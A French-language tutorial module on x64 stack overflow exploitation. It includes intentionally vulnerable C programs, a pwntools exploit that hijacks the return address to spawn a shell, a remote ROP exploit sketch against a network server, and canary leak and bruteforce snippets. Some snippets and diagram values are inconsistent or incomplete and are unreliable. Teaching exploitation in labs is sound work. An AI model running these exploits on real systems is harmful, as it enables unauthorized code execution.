# Module 27 : Stack Overflow x64

## ğŸ¯ Ce que tu vas apprendre
- Comprendre l'anatomie complÃ¨te de la stack en architecture x64
- MaÃ®triser les registres critiques (RSP, RBP, RIP)
- Calculer prÃ©cisÃ©ment les offsets pour l'exploitation
- CrÃ©er des payloads qui contournent les protections basiques
- Exploiter un stack overflow de maniÃ¨re systÃ©matique et reproductible
- Utiliser GDB pour analyser et dÃ©boguer tes exploits

## ğŸ“š ThÃ©orie

### C'est quoi un stack overflow en x64 ?

Un **stack overflow en x64** est l'exploitation d'un buffer overflow sur la pile (stack) dans un programme compilÃ© pour l'architecture x86-64 (64 bits).

**DiffÃ©rence clÃ© avec x86 (32 bits) :**
- Registres de **64 bits** (8 bytes) au lieu de 32 bits (4 bytes)
- Adresses mÃ©moire de **8 bytes** au lieu de 4 bytes
- Convention d'appel diffÃ©rente (arguments passÃ©s dans les registres)
- Espace d'adressage beaucoup plus grand (thÃ©oriquement 2^64 adresses)

### Pourquoi l'architecture x64 change tout ?

L'architecture x64 a introduit plusieurs changements critiques pour l'exploitation :

**1. Taille des pointeurs doublÃ©e**
```ascii
x86 (32-bit) :
Return Address = 4 bytes  (ex: 0x08048000)

x64 (64-bit) :
Return Address = 8 bytes  (ex: 0x0000000000400000)
```

**2. Registres Ã©tendus**
```ascii
x86 â†’ x64 :
EAX â†’ RAX  (32 bits â†’ 64 bits)
ESP â†’ RSP  (32 bits â†’ 64 bits)
EBP â†’ RBP  (32 bits â†’ 64 bits)
EIP â†’ RIP  (32 bits â†’ 64 bits)
```

**3. Convention d'appel (System V AMD64 ABI sur Linux)**
```ascii
x86 (arguments sur la stack) :
push arg3
push arg2
push arg1
call fonction

x64 (arguments dans les registres) :
mov rdi, arg1
mov rsi, arg2
mov rdx, arg3
call fonction
```

**4. Espace d'adressage canonique**
```ascii
Adresses valides en x64 :
0x0000000000000000 Ã  0x00007FFFFFFFFFFF  (User space)
0xFFFF800000000000 Ã  0xFFFFFFFFFFFFFFFF  (Kernel space)

Le "trou" entre les deux :
0x0000800000000000 Ã  0xFFFF7FFFFFFFFFFF  â†’ INVALIDE !
```

### Comment fonctionne la stack en x64 ?

**La stack (pile) en x64 croÃ®t vers les adresses BASSES** (downward).

#### Organisation mÃ©moire complÃ¨te :

```ascii
ESPACE D'ADRESSAGE x64 (Linux)

0xFFFFFFFFFFFFFFFF  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚  Kernel Space          â”‚  (Inaccessible en user mode)
0xFFFF800000000000  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                    â”‚                        â”‚
                    â”‚  TROU (Non canonical)  â”‚  â† Tentative d'accÃ¨s = crash
                    â”‚                        â”‚
0x00007FFFFFFFFFFF  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                    â”‚  Stack                 â”‚  â† Grandit vers le BAS â†“
                    â”‚  (0x7ffe...)           â”‚
0x00007F0000000000  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                    â”‚  Shared Libraries      â”‚  (libc, ld-linux.so...)
                    â”‚  (0x7f...)             â”‚
0x0000600000000000  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                    â”‚  Heap                  â”‚  â† Grandit vers le HAUT â†‘
                    â”‚  (malloc)              â”‚
0x0000555555554000  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                    â”‚  .data / .bss          â”‚  (Variables globales)
0x0000555555554000  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                    â”‚  .text                 â”‚  (Code du programme)
                    â”‚  (0x400000 ou 0x555...â”‚
0x0000000000000000  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Pourquoi les adresses stack commencent par 0x7f ou 0x7ffe ?**
- C'est la zone haute de l'espace user (prÃ¨s de 0x00007FFFFFFFFFFF)
- ASLR randomise lÃ©gÃ¨rement cette adresse

#### Stack Frame (cadre de pile) dÃ©taillÃ© :

```ascii
STACK FRAME d'une fonction en x64

Adresse HAUTE (ex: 0x7fffffffe100)
        â†“
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚  Arguments 7+ (si > 6 args)  â”‚  â† Arguments supplÃ©mentaires sur stack
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚  Return Address (8 bytes)    â”‚  â† Adresse oÃ¹ retourner (CIBLE !)
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â† Emplacement initial de RSP Ã  l'entrÃ©e
        â”‚  Saved RBP (8 bytes)         â”‚  â† RBP de la fonction appelante
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â† RBP pointe ici (repÃ¨re fixe)
        â”‚                              â”‚
        â”‚  Variables Locales           â”‚  â† char buffer[64] par exemple
        â”‚  (buffer[64] = 64 bytes)     â”‚
        â”‚                              â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â† RSP pointe ici (sommet actuel)
        â”‚  (espace libre)              â”‚
        â†“                              â†“
Adresse BASSE (ex: 0x7fffffffe000)
```

**Registres clÃ©s :**

**RSP (Stack Pointer)** :
- Pointe vers le **sommet actuel** de la stack
- Se dÃ©place Ã  chaque PUSH/POP
- Diminue lors d'un PUSH (stack grandit vers le bas)
- Augmente lors d'un POP (stack rÃ©trÃ©cit)

**RBP (Base Pointer)** :
- Pointe vers la **base du stack frame** actuel
- Reste fixe durant toute la fonction
- Sert de repÃ¨re pour accÃ©der aux variables locales et paramÃ¨tres
- Pattern d'entrÃ©e de fonction :
  ```asm
  push rbp           ; Sauvegarder ancien RBP
  mov rbp, rsp       ; Nouveau RBP = RSP actuel
  sub rsp, 64        ; Allouer 64 bytes pour variables locales
  ```

**RIP (Instruction Pointer)** :
- Pointe vers la **prochaine instruction** Ã  exÃ©cuter
- NE PEUT PAS Ãªtre modifiÃ© directement en user mode
- ModifiÃ© uniquement via : CALL, RET, JMP, JCC (jump conditionnel)
- En exploitation, on contrÃ´le RIP indirectement en Ã©crasant la Return Address

### Le mÃ©canisme d'appel de fonction en dÃ©tail

#### Avant l'appel (dans la fonction appelante) :

```asm
; PrÃ©parer les arguments (System V AMD64 ABI - Linux)
mov rdi, arg1      ; 1er argument
mov rsi, arg2      ; 2Ã¨me argument
mov rdx, arg3      ; 3Ã¨me argument
mov rcx, arg4      ; 4Ã¨me argument
mov r8, arg5       ; 5Ã¨me argument
mov r9, arg6       ; 6Ã¨me argument
; Arguments 7+ vont sur la stack

call fonction      ; Push RIP sur stack + Jump Ã  l'adresse de fonction
```

**L'instruction `call` fait 2 choses :**
1. `push rip` : Pousse l'adresse de retour (instruction aprÃ¨s call) sur la stack
2. `jmp fonction` : Saute Ã  l'adresse de la fonction

#### Au dÃ©but de la fonction :

```asm
fonction:
    push rbp           ; Sauvegarder RBP de l'appelant
    mov rbp, rsp       ; Nouveau RBP = RSP actuel (Ã©tablir le frame)
    sub rsp, 64        ; Allouer 64 bytes pour variables locales

    ; Corps de la fonction...

    leave              ; = mov rsp, rbp + pop rbp (dÃ©truire le frame)
    ret                ; = pop rip (retourner Ã  l'appelant)
```

**L'instruction `ret` fait :**
1. `pop rip` : DÃ©pile l'adresse de retour et la met dans RIP
2. Le CPU saute Ã  cette adresse

#### Visualisation complÃ¨te :

```ascii
AVANT call fonction:

Stack:
0x7ffe1020  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â† RSP (sommet)
            â”‚  (autre)   â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Registres:
RIP = 0x400520  (adresse de "call fonction")


PENDANT call fonction:

Stack:
0x7ffe1020  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  (autre)   â”‚
0x7ffe1018  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚ 0x400525   â”‚  â† Return Address (adresse aprÃ¨s call)
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â† RSP (sommet aprÃ¨s push)

Registres:
RIP = 0x400400  (dÃ©but de fonction)


APRÃˆS "push rbp; mov rbp, rsp; sub rsp, 64":

Stack:
0x7ffe1020  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  (autre)   â”‚
0x7ffe1018  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚ 0x400525   â”‚  â† Return Address
0x7ffe1010  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚ 0x7ffe1030 â”‚  â† Saved RBP
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â† RBP pointe ici
0x7ffe0fd0  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  buffer    â”‚  â† Variables locales (64 bytes)
            â”‚  [64]      â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â† RSP pointe ici


LORS DU RETOUR (leave; ret):

1. leave:
   - mov rsp, rbp    â†’ RSP = RBP (RSP = 0x7ffe1010)
   - pop rbp         â†’ RBP = 0x7ffe1030, RSP = 0x7ffe1018

Stack:
0x7ffe1018  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚ 0x400525   â”‚  â† Return Address
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â† RSP pointe ici

2. ret:
   - pop rip         â†’ RIP = 0x400525, RSP = 0x7ffe1020

Le programme continue Ã  0x400525 (juste aprÃ¨s le call)
```

### Calcul d'offset : la formule magique

Pour exploiter un stack overflow, tu dois savoir **exactement oÃ¹ se trouve la Return Address**.

**Formule gÃ©nÃ©rale :**
```
Offset_Return_Address = Taille_Buffer + Padding + Taille_Saved_RBP
```

**En dÃ©tail :**

1. **Taille_Buffer** : La taille du buffer vulnÃ©rable (ex: `char buffer[64]` â†’ 64 bytes)

2. **Padding** : Alignement potentiel ajoutÃ© par le compilateur
   - En x64, les variables sont souvent alignÃ©es sur 8 ou 16 bytes
   - Peut varier selon les options de compilation

3. **Taille_Saved_RBP** : Toujours **8 bytes** en x64

**Exemple concret :**
```c
void vulnerable() {
    char buffer[64];  // 64 bytes
    gets(buffer);     // VulnÃ©rable
}
```

**Sans padding :**
```
Offset = 64 (buffer) + 8 (saved RBP) = 72 bytes
```

**Payload :**
```python
payload = b'A' * 72 + p64(target_address)
          â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â”‚                  â”‚
          Remplir buffer     Nouvelle Return Address
          + saved RBP         (8 bytes, little-endian)
```

### Protections et comment les identifier

#### 1. Stack Canary (SSP - Stack Smashing Protector)

**C'est quoi ?**
Une valeur alÃ©atoire placÃ©e entre les variables locales et la Return Address.

```ascii
SANS CANARY :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  buffer    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  saved RBP â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ret addr  â”‚  â† Accessible directement
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

AVEC CANARY :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  buffer    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  CANARY    â”‚  â† Valeur secrÃ¨te (ex: 0x1234567890abcdef)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  saved RBP â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ret addr  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Si buffer overflow :
1. CANARY Ã©crasÃ©
2. Avant "ret", vÃ©rification : if (canary != original_canary) â†’ __stack_chk_fail()
3. Programme crash avec message "stack smashing detected"
```

**Comment dÃ©tecter ?**
```bash
checksec --file=./program
```
Chercher : `Canary: found` ou `No canary found`

**Comment bypasser ?**
- Leak le canary (format string, arbitrary read)
- Reconstruit le payload avec le vrai canary

#### 2. NX/DEP (Non-Executable Stack)

**C'est quoi ?**
La stack est marquÃ©e comme non-exÃ©cutable (permissions RW uniquement, pas X).

```ascii
SANS NX :
Stack: RWX  â† On peut exÃ©cuter du code
â”‚ Shellcode â”‚ â†’ Execute âœ“
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

AVEC NX :
Stack: RW-  â† ExÃ©cution interdite
â”‚ Shellcode â”‚ â†’ Execute âœ— â†’ SIGSEGV
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Comment dÃ©tecter ?**
```bash
checksec --file=./program
```
Chercher : `NX: NX enabled` ou `NX disabled`

**Comment bypasser ?**
- ROP (Return-Oriented Programming) : RÃ©utiliser du code existant
- ret2libc : Appeler des fonctions de la libc (ex: system("/bin/sh"))

#### 3. ASLR (Address Space Layout Randomization)

**C'est quoi ?**
Randomise les adresses mÃ©moire Ã  chaque exÃ©cution.

```ascii
SANS ASLR :
Exec 1: Stack Ã  0x7fffffffe000
Exec 2: Stack Ã  0x7fffffffe000  â† MÃªme adresse !
Exec 3: Stack Ã  0x7fffffffe000

AVEC ASLR :
Exec 1: Stack Ã  0x7fffffffe000
Exec 2: Stack Ã  0x7ffd12abc000  â† DiffÃ©rent !
Exec 3: Stack Ã  0x7ff9e8def000  â† DiffÃ©rent !
```

**Comment dÃ©tecter ?**
```bash
cat /proc/sys/kernel/randomize_va_space
# 0 = dÃ©sactivÃ©
# 1 = partial (stack/heap/libs)
# 2 = full (+ PIE)
```

**Comment bypasser ?**
- Information leak (format string, arbitrary read)
- Bruteforce (seulement si ASLR faible, ex: 32-bit)

#### 4. PIE (Position Independent Executable)

**C'est quoi ?**
Le code du programme lui-mÃªme est randomisÃ©.

```ascii
SANS PIE :
main() Ã  0x400000  (toujours pareil)

AVEC PIE :
Exec 1: main() Ã  0x5555555554e0
Exec 2: main() Ã  0x5566788994e0  â† Adresse diffÃ©rente !
```

**Comment dÃ©tecter ?**
```bash
checksec --file=./program
```
Chercher : `PIE: PIE enabled` ou `No PIE`

**Comment bypasser ?**
- Leak une adresse du code (ex: via format string)
- Calculer la base du binaire (adresse leakÃ©e - offset connu)

## ğŸ” Visualisation / SchÃ©ma

### Exploitation complÃ¨te Ã©tape par Ã©tape

```ascii
PROGRAMME VULNÃ‰RABLE :

#include <stdio.h>
#include <string.h>

void win() {
    printf("PWNED!\n");
    execve("/bin/sh", NULL, NULL);
}

void vulnerable() {
    char buffer[64];
    gets(buffer);  // âŒ VULNÃ‰RABLE
}

int main() {
    vulnerable();
    printf("Normal flow\n");
    return 0;
}


COMPILATION :
gcc vuln.c -o vuln -fno-stack-protector -no-pie -z execstack


Ã‰TAPE 1: Ã‰TAT INITIAL (avant gets())

Stack:
0x7ffe1018  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  Return Address     â”‚  = 0x0000000000400560 (adresse de printf)
0x7ffe1010  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚  Saved RBP          â”‚  = 0x00007ffe1030
0x7ffe1008  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â† RBP pointe ici
            â”‚                     â”‚
            â”‚  buffer[64]         â”‚  (vide, contient des valeurs alÃ©atoires)
            â”‚  (64 bytes)         â”‚
            â”‚                     â”‚
0x7ffe0fc8  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â† RSP pointe ici

Registres:
RIP = 0x400540  (adresse de gets())
RBP = 0x7ffe1008
RSP = 0x7ffe0fc8


Ã‰TAPE 2: UTILISATEUR ENTRE DU TEXTE

Input: "AAAA" (4 bytes) + '\n'

Stack aprÃ¨s gets():
0x7ffe1018  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  Return Address     â”‚  = 0x0000000000400560 (INTACT)
0x7ffe1010  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚  Saved RBP          â”‚  = 0x00007ffe1030 (INTACT)
0x7ffe1008  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚ 'A' 'A' 'A' 'A' '\0'â”‚  â† 5 bytes Ã©crits
            â”‚  (reste vide)       â”‚  â† 59 bytes non touchÃ©s
            â”‚                     â”‚
0x7ffe0fc8  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â†’ PAS D'OVERFLOW, comportement normal


Ã‰TAPE 3: ATTAQUE (Input: 72 'A' + adresse de win())

Input: 'A' * 72 + p64(0x400506)
       â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
      Remplir        Adresse de win()
      buffer+RBP

Stack aprÃ¨s gets():
0x7ffe1018  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  0x0000000000400506 â”‚  â† Ã‰CRASÃ‰ ! (adresse de win)
0x7ffe1010  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚  0x4141414141414141 â”‚  â† Saved RBP Ã©crasÃ© ('AAAAAAAA')
0x7ffe1008  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
            â”‚  AAAAAAAAAAAAAAAA   â”‚  â† 64 'A' remplissent le buffer
            â”‚  AAAAAAAAAAAAAAAA   â”‚
            â”‚  AAAAAAAAAAAAAAAA   â”‚
            â”‚  AAAAAAAAAAAAAAAA   â”‚
0x7ffe0fc8  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜


Ã‰TAPE 4: RETOUR DE vulnerable()

1. ExÃ©cution de "leave" :
   mov rsp, rbp    â†’ RSP = 0x7ffe1008
   pop rbp         â†’ RBP = 0x4141414141414141 (on s'en fiche)
                     RSP = 0x7ffe1010

2. ExÃ©cution de "ret" :
   pop rip         â†’ RIP = 0x0000000000400506  â† Adresse de win() !
                     RSP = 0x7ffe1018

3. Le CPU saute Ã  0x400506 â†’ win() s'exÃ©cute !

Stack:
0x7ffe1018  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â† RSP
            â”‚  (autre)            â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Registres:
RIP = 0x400506  (dÃ©but de win())
RBP = 0x4141414141414141  (Ã©crasÃ©, mais non utilisÃ©)
RSP = 0x7ffe1018


RÃ‰SULTAT:
PWNED!
$ whoami
root
```

## ğŸ’» Exemple pratique

### Programme vulnÃ©rable complet

**vuln.c :**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    printf("\n==============================\n");
    printf("  ğŸ‰ EXPLOITATION RÃ‰USSIE ! ğŸ‰  \n");
    printf("==============================\n\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];

    printf("Entrez votre nom : ");
    fflush(stdout);

    gets(buffer);  // âŒ VULNÃ‰RABLE : pas de limite

    printf("Bonjour, %s!\n", buffer);
}

int main() {
    printf("=== Programme de Stack Overflow x64 ===\n");
    printf("Adresse de win() : %p\n\n", (void*)win);

    vulnerable();

    printf("Retour normal au main()\n");
    return 0;
}
```

**Compilation (mode vulnÃ©rable pour apprentissage) :**
```bash
gcc vuln.c -o vuln -fno-stack-protector -no-pie -z execstack -Wno-deprecated-declarations

# Explications des flags :
# -fno-stack-protector        : Pas de canary
# -no-pie                      : Adresses fixes (pas de PIE)
# -z execstack                 : Stack exÃ©cutable (pas de NX)
# -Wno-deprecated-declarations : Ignore l'avertissement sur gets()
```

**VÃ©rification des protections :**
```bash
$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE
```

### Exploitation manuelle Ã©tape par Ã©tape

#### Ã‰tape 1 : ExÃ©cution normale

```bash
$ ./vuln
=== Programme de Stack Overflow x64 ===
Adresse de win() : 0x401136

Entrez votre nom : Alice
Bonjour, Alice!
Retour normal au main()
```

â†’ Comportement normal, pas d'overflow

#### Ã‰tape 2 : Trouver l'offset avec pattern

**CrÃ©er un pattern unique (avec pwntools) :**
```bash
python3 -c "from pwn import *; print(cyclic(100))" > pattern.txt
cat pattern.txt
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

**Envoyer le pattern :**
```bash
$ gdb ./vuln
(gdb) run < pattern.txt
Starting program: ./vuln < pattern.txt
=== Programme de Stack Overflow x64 ===
Adresse de win() : 0x401136

Entrez votre nom : Bonjour, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa!

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011e8 in vulnerable ()

(gdb) info registers rip
rip            0x4011e8
```

Attends, le programme n'a pas crashÃ© sur une adresse bizarre ? VÃ©rifions la stack :

```bash
(gdb) x/10gx $rsp
0x7fffffffe018: 0x6161616c6161616b  0x000061616161616d
                ^^^^^^^^^^^^^^^^^
                Ceci est "kaaalaaa" en little-endian !
```

**Trouver l'offset exact :**
```bash
python3 -c "from pwn import cyclic_find; print(cyclic_find(0x6161616c6161616b, n=8))"
72
```

â†’ L'offset est **72 bytes** (64 buffer + 8 saved RBP)

#### Ã‰tape 3 : Construire le payload

**exploit.py :**
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vuln'
context.binary = binary
context.log_level = 'info'

# Trouver l'adresse de win() (affichÃ©e par le programme ou via objdump)
win_addr = 0x401136

# Construire le payload
offset = 72                    # TrouvÃ© avec cyclic
payload = b'A' * offset        # Remplir buffer + saved RBP
payload += p64(win_addr)       # Ã‰craser Return Address avec adresse de win()

# Afficher le payload (debug)
log.info(f"Payload size: {len(payload)} bytes")
log.info(f"Target address: {hex(win_addr)}")
log.info(f"Payload: {payload}")

# Lancer le programme
p = process(binary)

# Recevoir le banner
print(p.recvuntil(b'Entrez votre nom : ').decode())

# Envoyer le payload
p.sendline(payload)

# Passer en mode interactif (pour utiliser le shell)
p.interactive()
```

**Explication ligne par ligne :**

```python
from pwn import *
# Importe la bibliothÃ¨que pwntools (pip install pwntools)

context.binary = binary
# Configure pwntools pour le binaire cible (dÃ©tecte l'architecture, etc.)

win_addr = 0x401136
# Adresse de la fonction win() (trouvÃ©e avec objdump ou affichÃ©e par le programme)

offset = 72
# Nombre de bytes avant la Return Address (64 buffer + 8 saved RBP)

payload = b'A' * offset
# Remplir le buffer et saved RBP avec des 'A' (0x41)

payload += p64(win_addr)
# p64() convertit l'adresse en little-endian 64-bit
# Ex: 0x401136 â†’ \x36\x11\x40\x00\x00\x00\x00\x00

p.sendline(payload)
# Envoie le payload + newline (\n) pour que gets() s'arrÃªte
```

#### Ã‰tape 4 : Exploitation

```bash
$ chmod +x exploit.py
$ ./exploit.py
[*] '/path/to/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
[*] Payload size: 80 bytes
[*] Target address: 0x401136
[+] Starting local process './vuln': pid 12345
=== Programme de Stack Overflow x64 ===
Adresse de win() : 0x401136

Entrez votre nom : Bonjour, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

==============================
  ğŸ‰ EXPLOITATION RÃ‰USSIE ! ğŸ‰
==============================

$ whoami
user
$ exit
```

**SUCCÃˆS !** On a redirigÃ© l'exÃ©cution vers win() et obtenu un shell.

### Analyse avec GDB (debug de l'exploit)

**Lancer avec GDB :**
```bash
$ gdb ./vuln
(gdb) break vulnerable        # Breakpoint au dÃ©but de vulnerable()
(gdb) run < <(python3 exploit.py --quiet)
```

**Inspecter la stack avant gets() :**
```bash
(gdb) x/20gx $rsp
0x7fffffffe000:  0x00007fffffffe018  0x0000000000000000
0x7fffffffe010:  0x00007fffffffe030  0x00000000004011f0  â† Saved RBP et Return Address
0x7fffffffe020:  0x00007ffff7de6d90  0x0000000000000000
...
```

**Continuer jusqu'aprÃ¨s gets() :**
```bash
(gdb) nexti
(gdb) x/20gx $rsp
0x7fffffffe000:  0x4141414141414141  0x4141414141414141  â† Buffer rempli de 'A'
0x7fffffffe010:  0x4141414141414141  0x0000000000401136  â† Return Address = win() !
...
```

**Inspecter RIP avant le ret :**
```bash
(gdb) break *vulnerable+XX   # Breakpoint sur l'instruction "ret"
(gdb) continue
(gdb) x/gx $rsp
0x7fffffffe018:  0x0000000000401136  â† Adresse sur le sommet de la stack
(gdb) stepi                   # ExÃ©cuter "ret"
(gdb) info registers rip
rip            0x401136        # RIP = adresse de win() !
```

## ğŸ¯ Application Red Team

### ScÃ©nario 1 : Exploitation d'un serveur rÃ©seau

**Contexte :**
Un serveur web custom Ã©coute sur le port 8080 et a un buffer overflow dans sa gestion des requÃªtes HTTP.

**server.c (vulnÃ©rable) :**
```c
void handle_request(int client_fd) {
    char buffer[512];

    recv(client_fd, buffer, 2048, 0);  // âŒ Lit 2048 bytes dans buffer de 512 !

    printf("Request: %s\n", buffer);
    send(client_fd, "HTTP/1.1 200 OK\r\n\r\n", 19, 0);
}
```

**Exploitation Ã  distance :**
```python
#!/usr/bin/env python3
from pwn import *

target = "192.168.1.100"
port = 8080

# Connexion
s = remote(target, port)

# Construire le payload ROP (car NX activÃ© sur le serveur)
# 1. Leak libc
# 2. Appeler system("/bin/sh")
offset = 512 + 8
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'A' * offset + rop.chain()

# Envoyer
s.send(payload)

# Shell interactif
s.interactive()
```

### ScÃ©nario 2 : Bypasser le Stack Canary

**Programme avec canary :**
```bash
gcc vuln.c -o vuln -no-pie  # Canary activÃ© par dÃ©faut
```

**Techniques de bypass :**

**1. Leak le canary (format string) :**
```python
# Ã‰tape 1 : Exploiter une format string pour leaker le canary
payload1 = b'%9$p'  # Lire la 9Ã¨me valeur sur la stack (canary)
p.sendline(payload1)
canary = int(p.recvline().strip(), 16)

# Ã‰tape 2 : Construire le payload avec le vrai canary
payload2 = b'A' * 64        # Remplir buffer
payload2 += p64(canary)     # Restaurer le canary
payload2 += b'B' * 8        # Saved RBP
payload2 += p64(win_addr)   # Return Address
p.sendline(payload2)
```

**2. Bruteforce le canary (byte par byte) :**
```python
# Le canary se termine toujours par \x00 (pour empÃªcher les leaks via strcpy)
# On brute-force les 7 autres bytes un par un

canary = b'\x00'
for i in range(7):
    for byte in range(256):
        payload = b'A' * 64 + canary + bytes([byte])
        p = process('./vuln')
        p.sendline(payload)
        response = p.recvall()
        if b'stack smashing' not in response:
            canary = bytes([byte]) + canary
            break
```

